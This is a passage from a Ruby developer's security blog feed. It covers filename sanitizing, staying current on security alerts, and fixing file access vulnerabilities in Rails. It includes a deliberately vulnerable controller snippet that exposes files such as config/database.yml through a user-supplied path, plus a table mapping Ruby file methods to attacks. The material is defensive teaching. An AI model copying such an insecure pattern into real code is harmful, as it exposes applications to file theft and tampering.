<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">sanitize</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span><span class='line'>  <span class="c1"># Bad as defined by wikipedia: https://en.wikipedia.org/wiki/Filename#Reserved_characters_and_words</span>
</span><span class='line'>  <span class="c1"># Also have to escape the backslash</span>
</span><span class='line'>  <span class="n">bad_chars</span> <span class="o">=</span> <span class="o">[</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;%&#39;</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="s1">&#39;:&#39;</span><span class="p">,</span> <span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="s1">&#39;&quot;&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span> <span class="o">]</span>
</span><span class='line'>  <span class="n">bad_chars</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">bad_char</span><span class="o">|</span>
</span><span class='line'>    <span class="n">filename</span><span class="o">.</span><span class="n">gsub!</span><span class="p">(</span><span class="n">bad_char</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="n">filename</span>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure>


<p>Using the function, with some weird input: <code>猪&lt;lǝgit&gt; "input" °?I |s:*w*:é::ä::r: /\.?%ʎן<span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/1f419.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="octopus">
              octopus
              </span>
            </span>
          ░</code> you get the
following back (results may vary by OS): <code>猪_lǝgit___input_°__I__s__w__é__ä__r______ʎן<span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/1f419.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="octopus">
              octopus
              </span>
            </span>
          ░</code>. And while
this isn&rsquo;t the prettiest filename, it&rsquo;s what the user wanted!</p>

<p><aside>
Unless they wanted <code>¯\_(ツ)_/¯</code>, then they get weird arms! <code>¯__(ツ)__¯</code>
You can&rsquo;t please everyone!
</aside></p>

<p>This code is more complex than the whitelisting sanitize, and it&rsquo;s more permissive. It&rsquo;s also more user friendly
since it&rsquo;s giving the user what they put in.</p>

<h2>Alternatives</h2>

<p>The last piece to mention is alternatives. If you&rsquo;re looking for a good gem that does this for you I&rsquo;d recommend <a href="https://github.com/madrobby/zaru">Zaru</a>. It handles the
same &ldquo;bad characters&rdquo; as the blacklist sanitize above, and also handles some windows edge cases for reserved words.
Plus it&rsquo;s got a test suite, which is a comfort when you&rsquo;re looking at filename sanitization!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Security for Ruby Developers: A Presentation]]></title>
    <link href="http://gavinmiller.io/2016/security-for-ruby-devs-presentation/">
    <updated>2016-01-06T19:51:00-07:00</updated>
    <id>http://gavinmiller.io/2016/security-for-ruby-devs-presentation</id>
    <content type="html"><![CDATA[<p>On Jan 5th, 2016 I gave a presentation to YYCRuby on security for Ruby developers. The presentation covers:</p>

<ul>
<li><a href="http://gavinmiller.io/2015/fixing-sql-injection-vulnerabilities/">Sql Injection</a></li>
<li>Timing Attacks</li>
<li><a href="http://gavinmiller.io/2015/staying-up-to-date-with-security-alerts/">Prevention</a></li>
</ul>


<p>If you weren&rsquo;t present, the slides probably won&rsquo;t make a whole lot of sense. The above links will take you to
detailed explanations of the topics I&rsquo;ve done previously.</p>

<p>I mentioned in the presentation some fantastic external tools that you can use to secure your app. They are:</p>

<ul>
<li><a href="https://appcanary.com/">AppCanary</a></li>
<li><a href="http://brakemanscanner.org/">Brakeman</a></li>
<li><a href="https://codeclimate.com/">Code Climate</a></li>
<li><a href="https://www.cvedetails.com/">CVE Details</a></li>
<li><a href="https://gemnasium.com/">Gemnasium</a></li>
<li><a href="https://hakiri.io/">Hakiri</a></li>
<li><a href="https://www.shodan.io/">Shodan</a></li>
<li><a href="http://sqlmap.org/">sqlmap</a></li>
</ul>


<script async class="speakerdeck-embed"
  data-id="b6d14383202f40cca2ab1fded75acd0c"
  data-ratio="1.33333333333333"
  src="http://gavinmiller.io//speakerdeck.com/assets/embed.js"></script>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How Do Ruby/Rails Developers Keep Updated On Security Alerts?]]></title>
    <link href="http://gavinmiller.io/2015/staying-up-to-date-with-security-alerts/">
    <updated>2015-11-15T14:14:00-07:00</updated>
    <id>http://gavinmiller.io/2015/staying-up-to-date-with-security-alerts</id>
    <content type="html"><![CDATA[<p>It&rsquo;s one thing to know about <a href="http://gavinmiller.io/2015/fixing-sql-injection-vulnerabilities/">SQL Injection</a>,
<a href="http://gavinmiller.io/2015/fixing-file-access-vulnerabilities-in-ruby-and-rails/">File Access Attacks</a>, XSS, and other security
hazards. And because you&rsquo;re a great developer you&rsquo;re regularly squashing vulnerabilities in your app.
And yet every Ruby/Rails developer is relying on someone else&rsquo;s code to do their work.
And guess what? No matter how careful you are, no matter how much time you spend perfecting your code,
someone else&rsquo;s code is going to have a security bug (yours will too if you &amp; I are being honest with each other!)</p>

<p>One of the questions that a few people have emailed me with now is: <em>&ldquo;How do I stay up to date on Ruby/Rails security?&rdquo;</em>
It&rsquo;s a great question! First because not enough developers care about security. Second because there are a lot of
great tools out there to help protect your app. Let&rsquo;s look at how you can stay up to date.</p>

<p><aside>
By the way feel free to email <a href="mailto:me@gavinmiller.io">me@gavinmiller.io</a> if you have questions too!
</aside></p>

<h2>Follow Relevant Mailing Lists</h2>

<p>The first step in keeping your app up to date and protected is to keep up with the news. The two main sources
of security news are the <a href="https://groups.google.com/forum/#!forum/ruby-security-ann">Ruby Security Mailing List</a> and the
<a href="https://groups.google.com/forum/?fromgroups#!forum/rubyonrails-security">Rails Security Mailing List</a>. Both lists focus
on security and will give you the best warning that an attack/fix is coming down the pipe.</p>

<h2>Follow CVE Reports</h2>

<p>Now the Ruby, and Rails mailing lists are great, but you have A LOT more dependencies in your app than that:
<code>nokogiri, rack, thin, puma, etc.</code>. Unless there was a major issue in these gems they&rsquo;re not going to make the
Rails or Ruby mailing list, so you need to get that information from elsewhere!</p>

<p>One of the little know resources for keeping up with security vulnerabilities are CVE databases. There are a few different
sites that offer this type of information and <a href="https://www.cvedetails.com/">CVE Details is my favorite</a> because
it&rsquo;s easy to consume the information.</p>

<p><a href="https://www.cvedetails.com/product/12215/Ruby-lang-Ruby.html?vendor_id=7252">Ruby</a> and
<a href="https://www.cvedetails.com/product/22568/Rubyonrails-Ruby-On-Rails.html?vendor_id=12043">Rails</a> both have
dedicated pages, and you can create an RSS feed of those pages. And for the major gems in your site navigate to
their pages and create an RSS feed for them as well!</p>

<h2>Keep Code Updated</h2>

<p>A simple way to keep your application up to date with the latest vulnerabilities is to not let your dependencies
become outdated. To do this run <code>bundle outdated</code> on your codebase and update the gems that are out of date.</p>

<p>This is usually easier said than done because updating dependencies can cause your application to break in
unexpected ways. The mitigation for that is keeping your tests up to date. If you can update a gem, run your
test suite, and nothing breaks (assuming >85% coverage), then you&rsquo;re likely in a good spot to roll that
dependency upgrade into production after some QA.</p>

<h2>Process</h2>

<p>A piece of advice that I&rsquo;ve read about security from <a href="https://news.ycombinator.com/user?id=tptacek">Thomas Ptacek</a>
who founded Matasano, a security consultancy. His <a href="https://news.ycombinator.com/item?id=3940286">advice</a> was:</p>

<blockquote><p>Put someone on your team in charge of tracking your dependencies (C libraries, Ruby gems, Python easy_install thingies) and have a process by which you periodically check to make sure you&rsquo;re capturing upstream security fixes. You should run your service aware of the fact that major vulnerabilities in third-party library code are often fixed without fanfare or advisories; when maintainers don&rsquo;t know exactly who&rsquo;s affected how, the whole announcement might happen in a git commit.</p></blockquote>

<p>I like this advice because it&rsquo;s easy. Start by having a security day with your team. Buy some <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/1f355.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="pizza">
              pizza
              </span>
            </span>
           and <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/1f37a.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="beer">
              beer
              </span>
            </span>
          
and go through your <code>Gemfile.lock</code> querying the <a href="https://www.cvedetails.com/">CVE Details database</a> and reviewing the
gem&rsquo;s repository. Then triage any issues and schedule fixes.</p>

<p>Why get the whole team together vs one person? Personally I&rsquo;m a fan of having the entire team involved in security since
it creates a culture of good practices vs just a single developer.</p>

<h2>Tooling</h2>

<p>The above processes sound cumbersome and manual (which some of it is going to be), so there are
tools that you can leverage to automate this type of work for you.</p>

<p><a href="https://github.com/rubysec/bundler-audit">Bundler Audit</a> is one of the nicer tools. It uses the
<a href="https://github.com/rubysec/ruby-advisory-db/">rubysec advisory db</a> to check for vulnerable gems in your
<code>Gemfile.lock</code> file, along with gem source issues. And it&rsquo;s as easy as running the <code>bundle-audit</code> command.</p>

<p>This is a nice gem because it takes the research leg out of your dependency updating. And bonus points since
it can fit in nicely as a CI build step. There are also paid versions that audit gem files as well
like: <a href="https://appcanary.com/">AppCanary</a>, <a href="https://hakiri.io/">Hakiri</a>, and <a href="https://gemnasium.com/">Gemnasium</a>.</p>

<h2>Why Stay Updated With Security?</h2>

<p>Wrapping up, I want to emphasize that it is important to keep dependencies up to date. Security is sometimes a tough
effort to justify because when it&rsquo;s working you&rsquo;ll rarely notice.</p>

<p>And with your apps security it doesn&rsquo;t pay to be complacent:</p>

<blockquote><p>Heard about a vulnerability? The adversary is not a stressed human like you. It&rsquo;s a for loop. The vuln is not secret; after all, you know.
  <br />&nbsp;&nbsp;&ndash; <a href="https://twitter.com/patio11/status/453918692066078720">Patio11 (Patrick McKenzie)</a></p></blockquote>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Fixing File Access Vulnerabilities in Ruby/Rails]]></title>
    <link href="http://gavinmiller.io/2015/fixing-file-access-vulnerabilities-in-ruby-and-rails/">
    <updated>2015-11-02T10:04:00-07:00</updated>
    <id>http://gavinmiller.io/2015/fixing-file-access-vulnerabilities-in-ruby-and-rails</id>
    <content type="html"><![CDATA[<p>Following up on a previous post about <a href="http://gavinmiller.io/2015/fixing-command-injection-vulnerabilities">Command Injection Vulnerabilities</a>,
this post is going to look at File Access Vulnerabilities.</p>

<p>File Access vulnerabilities fall under the category of Insecure Direct Object Reference vulnerabilities in the
OWASP top 10 lists. And for <a href="https://www.owasp.org/index.php/Top_10_2010-A4-Insecure_Direct_Object_References">2010</a>
and <a href="https://www.owasp.org/index.php/Top_10_2013-A4-Insecure_Direct_Object_References">2013</a>, Insecure Direct
Object vulnerabilities were number 3 for both years. <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/1f389.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="tada">
              tada
              </span>
            </span>
           <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/1f38a.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="confetti_ball">
              confetti_ball
              </span>
            </span>
           <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/1f386.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="fireworks">
              fireworks
              </span>
            </span>
          </p>

<h2>What is a File Access Vulnerability?</h2>

<p>A File Access vulnerability is when an attacker can use various calls to create, modify, or delete
files on your server&rsquo;s file system or a remote file system (eg: S3) that they shouldn&rsquo;t have permission to
modify.  Here&rsquo;s an example of a call that would allow an attacker to link your database file into the public
directory of a Rails server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># http://domain.com?payload=config/database.yml</span>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="n">params</span><span class="o">[</span><span class="ss">:payload</span><span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="n">path</span> <span class="o">=</span> <span class="no">Rails</span><span class="o">.</span><span class="n">root</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span><span class='line'><span class="nb">id</span> <span class="o">=</span> <span class="no">SecureRandom</span><span class="o">.</span><span class="n">uuid</span>
</span><span class='line'>
</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">link</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s2">&quot;public/</span><span class="si">#{</span><span class="nb">id</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">redirect_to</span> <span class="s2">&quot;/</span><span class="si">#{</span><span class="nb">id</span><span class="si">}</span><span class="s2">&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>While this example is contrived and code in the wild is not likely to look this obvious, the above is a
perfect example of how this type of attack functions. The attacker is able to manipulate your code into
linking (and therefore exposing) a file that you wouldn&rsquo;t want leaked.</p>

<p>Now the difficult thing is that there are an enormous number of methods that are vulnerable to File Access attacks.
Pulling from the <a href="https://github.com/presidentbeef/brakeman/blob/master/lib/brakeman/checks/check_file_access.rb#L11-L27">Brakeman</a>
source code, we can create a list of methods where a File Access vulnerability could occur:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># As of Oct 25, 2015</span>
</span><span class='line'><span class="c1"># From: https://github.com/presidentbeef/brakeman/blob/d2d49bd61f2d77919df17fd8dce6193cf1d1ada2/lib/brakeman/checks/check_file_access.rb#L11-L27</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Dir:</span>
</span><span class='line'><span class="no">Dir</span><span class="o">[]</span>
</span><span class='line'><span class="no">Dir</span><span class="o">.</span><span class="n">chdir</span>
</span><span class='line'><span class="no">Dir</span><span class="o">.</span><span class="n">chroot</span>
</span><span class='line'><span class="no">Dir</span><span class="o">.</span><span class="n">delete</span>
</span><span class='line'><span class="no">Dir</span><span class="o">.</span><span class="n">entries</span>
</span><span class='line'><span class="no">Dir</span><span class="o">.</span><span class="n">foreach</span>
</span><span class='line'><span class="no">Dir</span><span class="o">.</span><span class="n">glob</span>
</span><span class='line'><span class="no">Dir</span><span class="o">.</span><span class="n">new</span>
</span><span class='line'><span class="no">Dir</span><span class="o">.</span><span class="n">open</span>
</span><span class='line'><span class="no">Dir</span><span class="o">.</span><span class="n">rmdir</span>
</span><span class='line'><span class="no">Dir</span><span class="o">.</span><span class="n">unlink</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># File</span>
</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">delete</span>
</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">foreach</span>
</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">lchmod</span>
</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">lchown</span>
</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">link</span>
</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">new</span>
</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">open</span>
</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">read</span>
</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">readlines</span>
</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">rename</span>
</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">symlink</span>
</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">sysopen</span>
</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">truncate</span>
</span><span class='line'><span class="no">File</span><span class="o">.</span><span class="n">unlink</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># FileUtils</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">cd</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">chdir</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">chmod</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">chmod_R</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">chown</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">chown_R</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">cmp</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">compare_file</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">compare_stream</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">copy</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">copy_entry</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">copy_file</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">copy_stream</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">cp</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">cp_r</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">getwd</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">install</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">link</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">ln</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">ln_s</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">ln_sf</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">makedirs</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">mkdir</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">mkdir_p</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">mkpath</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">move</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">mv</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">pwd</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">remove</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">remove_dir</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">remove_entry</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">remove_entry_secure</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">remove_file</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">rm</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">rm_f</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">rm_r</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">rm_rf</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">rmdir</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">rmtree</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">safe_unlink</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">symlink</span>
</span><span class='line'><span class="no">FileUtils</span><span class="o">.</span><span class="n">touch</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># IO</span>
</span><span class='line'><span class="no">IO</span><span class="o">.</span><span class="n">foreach</span>
</span><span class='line'><span class="no">IO</span><span class="o">.</span><span class="n">new</span>
</span><span class='line'><span class="no">IO</span><span class="o">.</span><span class="n">open</span>
</span><span class='line'><span class="no">IO</span><span class="o">.</span><span class="n">read</span>
</span><span class='line'><span class="no">IO</span><span class="o">.</span><span class="n">readlines</span>
</span><span class='line'><span class="no">IO</span><span class="o">.</span><span class="n">sysopen</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Kernel</span>
</span><span class='line'><span class="no">Kernel</span><span class="o">.</span><span class="n">load</span>
</span><span class='line'><span class="no">Kernel</span><span class="o">.</span><span class="n">open</span>
</span><span class='line'><span class="no">Kernel</span><span class="o">.</span><span class="n">readlines</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Net::FTP</span>
</span><span class='line'><span class="ss">Net</span><span class="p">:</span><span class="ss">:FTP</span><span class="o">.</span><span class="n">new</span>
</span><span class='line'><span class="ss">Net</span><span class="p">:</span><span class="ss">:FTP</span><span class="o">.</span><span class="n">open</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Net::HTTP</span>
</span><span class='line'><span class="ss">Net</span><span class="p">:</span><span class="ss">:HTTP</span><span class="o">.</span><span class="n">new</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># PStore</span>
</span><span class='line'><span class="no">PStore</span><span class="o">.</span><span class="n">new</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Pathname</span>
</span><span class='line'><span class="no">Pathname</span><span class="o">.</span><span class="n">glob</span>
</span><span class='line'><span class="no">Pathname</span><span class="o">.</span><span class="n">new</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Shell</span>
</span><span class='line'><span class="no">Shell</span><span class="o">.</span><span class="n">new</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># YAML</span>
</span><span class='line'><span class="no">YAML</span><span class="o">.</span><span class="n">load_file</span>
</span><span class='line'><span class="no">YAML</span><span class="o">.</span><span class="n">parse_file</span>
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s a nasty long list. And what it means is when you make one of these calls, if you&rsquo;re using input a
user controls then they can attack your system!</p>

<p><aside>
One of the things to note about the above list is that you&rsquo;re never going to find methods like <code>.foreach</code> or
<code>.sysopen</code> in the <a href="http://ruby-doc.org/core-2.2.0/File.html">File docs</a>. This is because File inherits from
<code>IO</code>. What you need to recognize, is that if you&rsquo;ve created any special classes that inherit from <code>File</code>, <code>IO</code>,
<code>YAML</code>, etc. in your app, those won&rsquo;t get caught by Brakeman!
</aside></p>

<p>To top it all off, there are numerous different types of attacks that could performed. They&rsquo;re all dangerous
and slightly different:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='diff'><span class='line'>Filling up disk space:                         FileUtils.copy, FileUtils.cp, File.new, IO.new, PStore.new
</span><span class='line'>Move a file to a downloadable location:        File.rename, FileUtils.move
</span><span class='line'>Linking a file to a downloadable location:     File.link, File.symlink, FileUtils.link, FileUtils.ln
</span><span class='line'>Bricking your server (DoS):                    Dir.delete, FileUtils.rm
</span><span class='line'>Changing permissions to directories (DoS):     File.chmod, File.chown, FileUtils.chmod, FileUtils.chown
</span><span class='line'>Renaming key files:                            File.rename, FileUtils.move, FileUtils.mv
</span><span class='line'>Leaking paths:                                 FileUtils.pwd
</span><span class='line'>Downloading malicious files onto your server:  Net::FTP.new, Net::HTTP.new
</span><span class='line'>Launch an attack against another website:      Net::FTP.new, Net::HTTP.new
</span></code></pre></td></tr></table></div></figure>


<p>Some are more harmful than others and typically an attacker is going to leverage one or more of these
vulnerabilities to escalate their privileges to own your system. From wikipedia:</p>

<blockquote><p>Privilege escalation is the act of exploiting a bug, design flaw or configuration oversight in an operating
system or software application to gain elevated access to resources that are normally protected from an
application or user.</p></blockquote>

<h2>How do you Fix File Access Vulnerabilities?</h2>

<p>The best technique for preventing File Access vulnerabilities is not allowing them happen in the first place
and avoiding unnecessary system level operations.</p>

<p><em>Thanks Captain Obvious!</em> <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/facepalm.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="facepalm">
              facepalm
              </span>
            </span>
          </p>

<p>While that advice is correct, it&rsquo;s not necessarily good or helpful, so let&rsquo;s look at the techniques you can
use to keep File Access attacks from happening when you do need to work with your system.</p>

<p><a name="restriction-via-identifier"></a></p>

<h3>Restriction via Identifier</h3>

<p>The first way to do that is by using an identifier to refer to files on disk. This identifier will take the
form of an id, hash, or GUID.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># HTML</span>
</span><span class='line'><span class="o">&lt;</span><span class="nb">select</span> <span class="nb">name</span><span class="o">=</span><span class="s2">&quot;file_guid&quot;</span><span class="o">&gt;</span>
</span><span class='line'>  <span class="o">&lt;</span><span class="n">option</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;690e1597-de8d-4912-ac04-d0e626f806f4&quot;</span><span class="o">&gt;</span><span class="n">file1</span><span class="o">.</span><span class="n">log</span><span class="o">&lt;</span><span class="sr">/option&gt;</span>
</span><span class='line'><span class="sr">  &lt;option value=&quot;2e157fa3-ea1e-4b46-931e-c0f8b10bfcb2&quot;&gt;file2.log&lt;/o</span><span class="n">ption</span><span class="o">&gt;</span>
</span><span class='line'>  <span class="o">&lt;</span><span class="n">option</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;fffb938b-07bc-472c-a48f-383123a9f04d&quot;</span><span class="o">&gt;</span><span class="n">file3</span><span class="o">.</span><span class="n">log</span><span class="o">&lt;</span><span class="sr">/option&gt;</span>
</span><span class='line'><span class="sr">&lt;/se</span><span class="n">lect</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># Controller</span>
